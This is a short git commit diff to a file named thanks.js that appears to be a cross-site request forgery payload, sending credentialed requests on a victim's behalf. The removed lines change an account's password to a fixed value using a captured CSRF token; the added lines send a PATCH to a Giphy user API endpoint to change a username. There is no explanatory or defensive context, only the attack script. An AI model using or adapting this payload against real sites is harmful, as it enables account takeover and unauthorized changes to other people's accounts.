18b5a2629d260c2cb0637cc447d82c9ec39cebc2
naysser <77415898+naysser@users.noreply.github.com>
2021-08-17 02:11:41 +0200

    Update thanks.js

--- thanks.js
+++ thanks.js
@@ -1,10 +1,10 @@
 var xhr = new XMLHttpRequest();
-xhr.open("POST", "https://example.com"+param+"/password", true);
+xhr.open("PATCH", "https://giphy.com/api/v1/users/38283249/"+param+"/username", true);
 xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
 xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
 xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
 xhr.withCredentials = true;
-var body = "setNewPassword_first=passwordQ!&setNewPassword_second=passwordQ!&setNewPassword%5Bcreate%5D=&setNewPassword%5B_token%5D="+csrf;
+var body = "username=hello9J9j";
 var aBody = new Uint8Array(body.length);
 for (var i = 0; i < aBody.length; i++)
 aBody[i] = body.charCodeAt(i); 
